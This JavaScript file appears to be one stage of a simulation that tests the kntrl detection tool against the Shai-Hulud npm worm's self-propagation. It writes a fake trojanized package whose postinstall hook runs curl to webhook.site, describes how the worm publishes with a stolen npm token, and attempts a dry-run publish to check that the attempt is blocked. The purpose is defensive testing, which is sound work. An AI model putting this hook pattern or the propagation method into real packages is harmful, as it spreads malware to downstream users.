/**
 * Stage 7 — Self-propagation via npm publish
 *
 * The core worm behavior: Shai-Hulud modifies package.json of the
 * victim's packages to inject a malicious postinstall hook, then
 * runs `npm publish` to spread to downstream consumers.
 *
 * The worm uses the stolen NPM_TOKEN from stage 1 to authenticate.
 * It typically creates a patched copy in /tmp and publishes from there.
 *
 * kntrl detection:
 *   - YAML blocked_chains: blocks bash/sh from npm ancestry
 *   - Process chain: npm → node → bash → npm publish (nested npm blocked)
 *   - File monitoring: alerts on .npmrc modification
 *
 * SAFE: This simulation does NOT actually publish anything.
 * It creates a temp directory, writes a fake package, and attempts
 * the publish (which will fail due to missing auth + kntrl blocking).
 */

const { execSync } = require("child_process");
const fs = require("fs");
const path = require("path");
const os = require("os");

// Create a temp workspace for the fake publish
const tmpDir = path.join(os.tmpdir(), "shai-hulud-sim-" + process.pid);
fs.mkdirSync(tmpDir, { recursive: true });

// Write a fake trojanized package
const trojanPkg = {
  name: "totally-legit-package-sim",
  version: "9.9.9",
  description: "SIMULATED trojanized package — not real",
  scripts: {
    postinstall: "node -e \"require('child_process').execSync('curl https://webhook.site/worm')\"",
  },
};
fs.writeFileSync(path.join(tmpDir, "package.json"), JSON.stringify(trojanPkg, null, 2));
fs.writeFileSync(path.join(tmpDir, "index.js"), "// simulated worm payload\n");

console.log(`  [propagate] Created trojanized package in ${tmpDir}`);
console.log(`  [propagate] Attempting npm publish (will fail — no auth, kntrl blocks) ...`);

try {
  // This spawns bash from node (npm ancestry) — triggers blocked_chains
  execSync(`bash -c "cd '${tmpDir}' && npm publish --dry-run 2>&1"`, {
    stdio: "inherit",
    timeout: 10000,
  });
  console.log("  [propagate] WARNING: npm publish attempt completed (should be blocked!)");
} catch (err) {
  if (err.signal === "SIGKILL") {
    console.log("  [propagate] bash killed by kntrl (SIGKILL) — shell-from-npm block working");
  } else {
    console.log("  [propagate] publish failed — expected (blocked or no auth)");
  }
}

// Cleanup
try {
  fs.rmSync(tmpDir, { recursive: true, force: true });
} catch {}
